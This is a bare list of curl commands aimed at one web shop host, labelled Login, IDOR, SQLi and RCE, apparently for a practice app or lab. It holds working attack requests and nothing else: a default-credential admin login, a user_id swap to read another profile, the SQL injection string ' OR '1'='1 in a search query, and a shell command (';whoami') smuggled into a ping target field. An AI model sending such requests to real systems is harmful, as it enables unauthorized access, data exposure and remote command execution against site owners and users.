# Login
curl -X POST https://nexshop.pages.dev/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# IDOR
curl https://nexshop.pages.dev/api/profile?user_id=3

# SQLi
curl "https://nexshop.pages.dev/api/search?q=' OR '1'='1"

# RCE
curl -X POST https://nexshop.pages.dev/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target":"127.0.0.1;whoami"}'

  